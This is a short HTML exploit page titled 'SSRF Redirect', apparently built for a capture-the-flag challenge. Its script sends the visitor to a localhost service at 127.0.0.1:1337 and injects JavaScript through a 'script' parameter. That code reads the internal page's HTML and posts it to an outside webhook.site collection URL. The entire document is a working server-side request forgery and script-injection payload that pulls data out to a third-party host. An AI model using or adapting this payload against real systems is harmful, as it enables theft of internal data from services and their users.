<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF Redirect</title>
</head>
<body>
    <h1>Redirecting...</h1>
    <script>
    
        // Redirect with a script to send content
        window.location = 'http://127.0.0.1:1337/tables?' +
            'script=' + encodeURIComponent(
                'fetch("https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84", {' +
                'method: "POST", ' +
                'headers: {"Content-Type": "application/x-www-form-urlencoded"}, ' +
                'body: "tables=" + encodeURIComponent(document.body.innerHTML)' +
                '})'
            );
    </script>
</body>
</html>
